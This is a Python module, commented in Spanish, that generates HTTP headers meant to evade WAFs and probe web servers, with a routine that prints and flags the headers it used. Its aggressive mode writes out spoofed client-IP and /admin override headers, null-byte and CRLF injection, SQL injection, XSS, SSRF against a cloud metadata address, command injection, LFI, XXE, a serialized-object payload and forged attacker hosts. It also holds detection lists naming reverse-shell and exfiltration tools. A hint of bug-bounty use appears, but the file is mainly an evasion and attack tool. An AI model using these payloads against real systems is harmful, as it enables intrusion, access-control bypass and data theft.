import random
import uuid
import time

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
]

EXTRA_HEADERS = [
    # Headers útiles para bypass, fingerprinting y evasión
    ("X-Forwarded-For", "127.0.0.1"),
    ("X-Originating-IP", "127.0.0.1"),
    ("X-Remote-IP", "127.0.0.1"),
    ("X-Remote-Addr", "127.0.0.1"),
    ("X-Client-IP", "127.0.0.1"),
    ("X-Host", "localhost"),
    ("X-Original-URL", "/admin"),
    ("X-HTTP-Method-Override", "PUT"),
    ("X-ATT-DeviceId", str(uuid.uuid4())),
    ("X-Wap-Profile", "http://wap.samsungmobile.com/uaprof/SGH-I777.xml"),
    ("X-UIDH", str(uuid.uuid4())),
    ("X-Csrf-Token", str(uuid.uuid4())),
    ("DNT", "1"),
    ("Origin", "null"),
    ("Sec-Fetch-Site", "cross-site"),
    ("Sec-Fetch-Mode", "no-cors"),
    ("Sec-Fetch-Dest", "document"),
    ("Upgrade-Insecure-Requests", "1"),
    ("Cache-Control", "no-store"),
    ("Pragma", "no-cache"),
    ("TE", "Trailers"),
    ("If-Modified-Since", time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime())),
    ("If-Unmodified-Since", time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime())),
    ("Accept-Encoding", "gzip, deflate, br"),
    ("Accept-Charset", "utf-8"),
    ("Accept", "*/*"),
]

def generar_headers(
    cookie=None,
    token_csrf=None,
    referer=None,
    aggressive=False,
    custom_headers=None,
    rotate_ip=False,
    spoof_methods=False,
    randomize_ua=True,
    inject_nulls=False,
    accept_all=True,
    fake_content_types=False,
    advanced_fingerprint=False
):
    headers = {
        "User-Agent": random.choice(USER_AGENTS) if randomize_ua else USER_AGENTS[0],
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "close"
    }

    if cookie:
        headers["Cookie"] = cookie

    if token_csrf:
        headers["X-CSRF-Token"] = token_csrf
        headers["X-Requested-With"] = "XMLHttpRequest"

    if referer:
        headers["Referer"] = referer

    # Headers agresivos y evasivos
    if aggressive:
        for k, v in EXTRA_HEADERS:
            headers[k] = v
        if rotate_ip:
            fake_ip = f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"
            for ip_header in ["X-Forwarded-For", "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr", "X-Client-IP"]:
                headers[ip_header] = fake_ip
        if spoof_methods:
            headers["X-HTTP-Method-Override"] = random.choice(["PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"])
        if inject_nulls:
            # Inyecta headers con null bytes para evasión de WAFs
            headers["Null-Header\x00"] = "null"
        if accept_all:
            headers["Accept"] = "*/*"
        if fake_content_types:
            # Añade content-types falsos para confundir parsers
            headers["Content-Type"] = random.choice([
                "application/json", "application/xml", "text/plain", "application/octet-stream", "multipart/form-data"
            ])
        if advanced_fingerprint:
            # Headers para fingerprinting avanzado y evasión
            headers["X-Amzn-Trace-Id"] = str(uuid.uuid4())
            headers["X-Request-Id"] = str(uuid.uuid4())
            headers["X-Api-Version"] = "99.99"
            headers["X-Forwarded-Proto"] = "https"
            headers["X-Original-Method"] = random.choice(["GET", "POST", "PUT", "DELETE"])
            headers["X-Forwarded-Host"] = "evil.com"
            headers["X-Forwarded-Port"] = str(random.randint(1,65535))
            headers["X-Forwarded-Scheme"] = "https"
            headers["X-Original-URL"] = "/admin"
            headers["X-Original-Forwarded-For"] = "127.0.0.1"
            headers["X-HTTP-Path-Override"] = "/etc/passwd"
            headers["X-HTTP-Host-Override"] = "localhost"
            headers["X-HTTP-Url-Override"] = "http://localhost/admin"

    # Headers personalizados del usuario
    if custom_headers:
        for k, v in custom_headers.items():
            headers[k] = v

    # Añadir headers para maximizar fingerprinting y evasión
    headers["Forwarded"] = f"for={headers.get('X-Forwarded-For','127.0.0.1')};proto=https"
    headers["Via"] = "1.1 bugbounty-proxy"
    headers["Max-Forwards"] = str(random.randint(1, 20))

    # Variante ultra agresiva: duplicar headers críticos
    if aggressive:
        for h in ["X-Forwarded-For", "X-Requested-With", "Referer"]:
            if h in headers:
                headers[h + "-Duplicate"] = headers[h]
        # Inyección de headers con valores unicode y control chars para evasión máxima
        headers["X-Evil-Header"] = "💀" * random.randint(1, 5)
        headers["X-Null-Byte"] = "test\x00exploit"
        headers["X-CRLF-Injection"] = "test\r\nInjected: injected"
        headers["X-Long-Header"] = "A" * 4096
        headers["X-Tab-Injection"] = "test\tinjected"
        # Headers con valores de otros headers
        headers["X-Reflect-User-Agent"] = headers.get("User-Agent", "")
        headers["X-Reflect-Cookie"] = headers.get("Cookie", "")
        # Headers con valores de IPs públicas y privadas
        headers["X-Alt-Forwarded-For"] = "8.8.8.8, 127.0.0.1, 10.0.0.1"
        # Headers con valores de fechas futuras/pasadas
        headers["If-Modified-Since"] = "Sat, 01 Jan 2050 00:00:00 GMT"
        headers["If-Unmodified-Since"] = "Sat, 01 Jan 1970 00:00:00 GMT"
        # Headers con valores de rutas sospechosas
        headers["X-Original-URL"] = "/etc/passwd"
        headers["X-Override-URL"] = "/admin"
        # Headers con valores de dominios maliciosos
        headers["X-Forwarded-Host"] = "attacker.evil"
        headers["X-Forwarded-Server"] = "malicious.server"
        # Headers con valores de user-agents raros
        headers["X-Alt-User-Agent"] = "sqlmap/1.5.2#dev"
        # Headers con valores de encoding raros
        headers["X-Encoding-Test"] = "=?utf-7?Q?+ADw-script+AD4-alert(1)+ADw-/script+AD4-?="
        # Headers con valores de path traversal
        headers["X-Path-Traversal"] = "../../../../../../etc/passwd"
        # Headers con valores de SQLi
        headers["X-SQL-Injection"] = "' OR '1'='1"
        # Headers con valores de XSS
        headers["X-XSS-Test"] = "<script>alert(1337)</script>"
        # Headers con valores de SSRF
        headers["X-SSRF-Test"] = "http://169.254.169.254/latest/meta-data/"
        # Headers con valores de RCE
        headers["X-RCE-Test"] = "`id`"
        # Headers con valores de LFI
        headers["X-LFI-Test"] = "/proc/self/environ"
        # Headers con valores de XXE
        headers["X-XXE-Test"] = "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"
        # Headers con valores de deserialización
        headers["X-Deserialization-Test"] = "rO0ABXNyABFqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAABdwQAAAABdAABMQ=="
        # Headers con valores de fuzzing
        headers["X-Fuzz-Test"] = "FUZZ"
        # Headers con valores de unicode homoglyphs
        headers["X-Homoglyph-Test"] = "раурау.com"  # cyrillic letters

    return headers

def imprimir_headers(headers):
    print("\n==== HEADERS USADOS ====")
    for k, v in headers.items():
        print(f"{k}: {v}")
    print(f"Total headers: {len(headers)}")
    # Mostrar advertencia si hay headers sospechosos
    if "X-HTTP-Method-Override" in headers:
        print("[!] X-HTTP-Method-Override activo (spoofing de método HTTP)")
    if "Forwarded" in headers:
        print("[!] Header Forwarded presente (puede alterar logs del servidor)")
    if any("\x00" in k for k in headers):
        print("[!] Null byte injection detectada en headers")
    if any("-Duplicate" in k for k in headers):
        print("[!] Headers críticos duplicados para evasión")
    if "X-Evil-Header" in headers:
        print("[!] Header ultra agresivo X-Evil-Header presente")
    if "X-CRLF-Injection" in headers:
        print("[!] Header con posible CRLF injection presente")
    if "X-Long-Header" in headers:
        print("[!] Header extremadamente largo presente")
    if "X-Path-Traversal" in headers:
        print("[!] Header con path traversal detectado")
    if "X-SQL-Injection" in headers:
        print("[!] Header con SQL injection detectado")
    if "X-XSS-Test" in headers:
        print("[!] Header con XSS detectado")
    if "X-SSRF-Test" in headers:
        print("[!] Header con SSRF detectado")
    if "X-RCE-Test" in headers:
        print("[!] Header con RCE detectado")
    if "X-LFI-Test" in headers:
        print("[!] Header con LFI detectado")
    if "X-XXE-Test" in headers:
        print("[!] Header con XXE detectado")
    if "X-Deserialization-Test" in headers:
        print("[!] Header con posible vector de deserialización detectado")
    if "X-Fuzz-Test" in headers:
        print("[!] Header de fuzzing activo")
    if "X-Homoglyph-Test" in headers:
        print("[!] Header con unicode homoglyphs presente")
    # Detección de headers con valores sospechosos o peligrosos
    for k, v in headers.items():
        if isinstance(v, str):
            lower_v = v.lower()
            # Detección de patrones de ataque y técnicas avanzadas
            attack_patterns = [
                "<script>", "<?xml", "../../../../", "`id`", "fuzz", "alert(", "/etc/passwd",
                "169.254.169.254", "sqlmap", "malicious.server", "attacker.evil",
                "union select", "sleep(", "benchmark(", "file://", "data://", "base64,", "onerror=", "onload=",
                "drop table", "insert into", "update ", "delete from", "outfile", "load_file", "xp_cmdshell",
                "curl", "wget", "powershell", "bash", "sh -c", "python", "perl", "ruby", "nc -e", "bash -i",
                "system(", "exec(", "eval(", "document.cookie", "window.location", "<iframe", "<img", "<svg",
                "<body", "<video", "<audio", "<marquee", "<object", "<embed", "<link", "<meta", "<style",
                "set-cookie", "authorization: bearer", "jwt", "eyj", "token=", "admin", "root", "passwd",
                "flag{", "ctf{", "secret", "private", "confidential", "sensitive", "api-key", "apikey", "access_token"
            ]
            if any(x in lower_v for x in attack_patterns):
                print(f"[!] Valor altamente sospechoso en header {k}: {v[:60] + ('...' if len(v) > 60 else '')}")
            if len(v) > 1024:
                print(f"[!] Header {k} tiene un valor extremadamente largo ({len(v)} bytes)")
            # Detección de posibles bypasses de WAF/IDS
            if any(c in v for c in ["\x00", "\r", "\n", "\t", "\x1b", "\u202e", "\u202d", "\u202c"]):
                print(f"[!] Header {k} contiene caracteres de control/unicode bidi (posible evasión WAF/IDS)")
            # Detección de unicode raro
            if any(ord(c) > 127 for c in v):
                print(f"[!] Header {k} contiene unicode no ASCII (posible evasión)")
            # Detección de headers con valores repetidos o patrones de ataque
            if v.count("/") > 10 or v.count("\\") > 10 or v.count("..") > 5:
                print(f"[!] Header {k} contiene patrones de traversal o repetición sospechosa")
            if v.count("<") > 5 or v.count(">") > 5:
                print(f"[!] Header {k} contiene múltiples tags HTML (posible XSS masivo)")
            # Detección de posibles fugas de información sensible
            sensitive_keywords = [
                "flag{", "ctf{", "api-key", "apikey", "access_token", "secret", "private", "confidential",
                "password", "passwd", "token", "jwt", "bearer", "sessionid", "auth", "credential", "key="
            ]
            if any(sk in lower_v for sk in sensitive_keywords):
                print(f"[!] Header {k} podría estar filtrando información sensible: {v[:60] + ('...' if len(v) > 60 else '')}")
            # Detección de headers con valores de exfiltración o callback
            if any(x in lower_v for x in ["burpcollaborator.net", "canarytokens.com", "requestbin.net", "webhook.site"]):
                print(f"[!] Header {k} contiene posible vector de exfiltración/callback: {v[:60] + ('...' if len(v) > 60 else '')}")
    # Sugerencia de uso avanzado
    print("[*] Usa rotate_ip, spoof_methods, advanced_fingerprint, inject_nulls, fake_content_types, aggressive=True y custom_headers para máxima evasión, ataque, fuzzing, exfiltración y callback.")